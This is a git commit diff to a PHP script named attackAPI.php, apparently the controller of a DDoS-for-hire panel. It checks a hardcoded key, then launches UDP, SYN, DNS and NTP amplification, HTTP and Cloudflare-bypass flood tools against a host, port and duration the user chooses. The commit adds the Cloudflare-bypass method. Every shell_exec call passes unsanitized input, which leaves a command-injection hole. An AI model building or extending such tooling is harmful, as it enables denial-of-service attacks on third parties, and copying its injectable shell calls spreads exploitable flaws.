20ec65c4d5c77e77bd41b34e8bd69b158c260be2
SwordDev <70377885+SwordLoveDev@users.noreply.github.com>
2021-03-30 22:18:05 +0200

    Update attackAPI.php

--- attackAPI.php
+++ attackAPI.php
@@ -11,23 +11,32 @@ if ($key == "mdp") {
     if ($method == "UDP") {
         shell_exec("cd /home/kali/script/ && ./udp $host $port $time");
         echo "Attack sent on $host with the port $port for $time s with $method method.";
-        header('Refresh: 3; ./panel.php');
+        header('Refresh: 3; ./panel.html');
     }
     if ($method == "SYN") { 
         shell_exec("cd /home/kali/script/ && ./syn $host $port $time");
         echo "Attack sent on $host with the port $port for $time s with $method method.";
+        header('Refresh: 3; ./panel.html');
     }
     if ($method == "AMP-DNS") { 
         shell_exec("cd /home/kali/script/ && ./amp-dns $host dns.txt $port $time");
         echo "Attack sent on $host with the port $port for $time s with $method method.";
+        header('Refresh: 3; ./panel.html');
     }
     if ($method == "AMP-NTP") { 
         shell_exec("cd /home/kali/script/ && ./amp-ntp $host ntp.txt $port $time");
         echo "Attack sent on $host with the port $port for $time s with $method method.";
+        header('Refresh: 3; ./panel.html');
     }
     if ($method == "HTTP") { 
         shell_exec("cd /home/kali/script/ && ./http $host $port $time");
         echo "Attack sent on $host with the port $port for $time s with $method method.";
+        header('Refresh: 3; ./panel.html');
+    }
+    if ($method == "CF-BYPASS") { 
+        shell_exec("cd /home/kali/script/ && ./cf-bypass $host proxy.txt $port $time");
+        echo "Attack sent on $host with the port $port for $time s with $method method.";
+        header('Refresh: 3; ./panel.html');
     }
 }
 else { 
